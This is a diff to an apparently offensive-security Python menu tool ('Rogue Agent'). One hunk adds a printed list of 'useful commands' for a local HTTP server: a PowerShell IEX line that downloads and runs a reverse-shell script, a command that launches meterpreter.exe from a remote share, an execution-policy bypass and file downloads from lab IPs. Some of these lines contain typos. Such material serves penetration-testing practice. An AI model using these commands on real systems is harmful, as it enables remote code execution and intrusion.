@@ -1651,6 +1651,13 @@ while True:
             print(colored("[*] Specified local service started...", colour3))
             runCommand("xdotool key Ctrl+Shift+T")
             runCommand("xdotool key Alt+Shift+S; xdotool type 'LOCAL SERVICE'; xdotool key Return")
+            if choice[:22] == "python3 -m http.server":
+               print(colored("\nUSEFUL COMMANDS\n",colour7,attrs=['bold']))
+               print("wget \"http://10.10.14.33:8000/All/filename\"")
+               print("Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted")
+               print("powersehll \"IEX(New-Object Net.WebClient).downloadString('https://10.10.14.12.80/APT/reverseshell.ps1)'\"")
+               print("C:\Windows\System32\cmd.exe /c \\\\10.10.14.12:80\APT\meterpreter.exe")
+               print("powershell \"iwr -Uri http://10.10.14.12:80/APT/filename\" -outfile filename")            
             dispBanner("LOCAL SERVICE",0) 
             runCommand("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
             runCommand("xdotool type '" + choice + "'; xdotool key Return")
@@ -3938,7 +3945,7 @@ while True:
 
    if selection == '100':
       dispBanner("ROGUE AGENT",1)
-      print(colored("C O P Y R I G H T  2 0 2 1  -  T E R E N C E  B R O A D B E N T",colour7,attrs=['bold']))
+      print(colored("C O P Y R I G H T  2 0 2 2  -  T E R E N C E  B R O A D B E N T",colour7,attrs=['bold']))
       print("\n------------------------------------------------------------------------------")
       count = lineCount(dataDir + "/usernames.txt")
       print("User Names : " + str(count))
